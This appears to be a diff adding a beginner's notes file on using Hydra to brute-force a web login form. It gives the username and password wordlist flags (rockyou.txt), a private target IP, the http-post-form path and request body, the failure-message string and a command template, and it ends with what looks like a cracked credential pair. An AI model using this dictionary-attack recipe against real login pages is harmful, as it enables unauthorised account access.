@@ -1,0 +1,54 @@
+{EVERYTHING ENCLOSED IN CURLY BRACKETS SHOULD SERVE AS GUIDELINES--everything after ">>" symbol should be treated as codes}
+
+{Hydra is a fairly straight forward tool to use, but we have to first understand what it needs to work correctly. 
+We’ll need to provide the following in order to break in:
+
+-Login or Wordlist for Usernames
+-Password or Wordlist for Passwords
+-IP address or Hostname
+-HTTP Method (POST/GET)
+-Directory/Path to the Login Page
+-Request Body for Username/Password
+-A Way to Identify Failed Attempts
+-Let’s start piecing together all the necessary flags before finalizing our command.
+}
+
+[A]Specifying Username
+>> -l username  "whereby username should be an existing username such as pash/patrikey"
+
+{If you don’t know the username, you could leverage -L(hydra command) to provide a wordlist and attempt to 
+enumerate usernames. This will only be effective if the website provides a way for you to determine correct 
+usernames, such as saying “Incorrect Username” or “Incorrect Password”, rather than a vague message like “Invalid Credentials”.}
+
+[B]Specifying Password
+{
+We don’t know the password, so we’ll want to use a wordlist in order to perform a Dictionary Attack.
+Let’s try using the common rockyou.txt list (by specifying a capital -P) available on Kali in the /usr/share/wordlists/ directory.
+}
+>>-P /usr/share/wordlists/rockyou.txt
+
+[C]IP Address to Attack
+{I'll give my kenyan phone ip adress to simulate the attack}
+>>192.168.132.28:3455
+
+[D] Specifying format
+{Specify the correct https format of the website either GET/POST--Google on how to know that. In my case I'll use POST}
+
+>>http-post-form
+
+{Note that You’ll need to enter https if you’re attacking a site on port 443.}
+
+>>/department/login.php
+>>username=InfiniteLogins&password=Password
+>>username=admin&password=^PASS^
+>>Invalid Password!
+>>sudo hydra <Username/List> <Password/List> <IP> <Method> "<Path>:<RequestBody>:<IncorrectVerbiage>"
+password==pash:1q2w3e4r5t
+
+
+
+
+
+
+
+
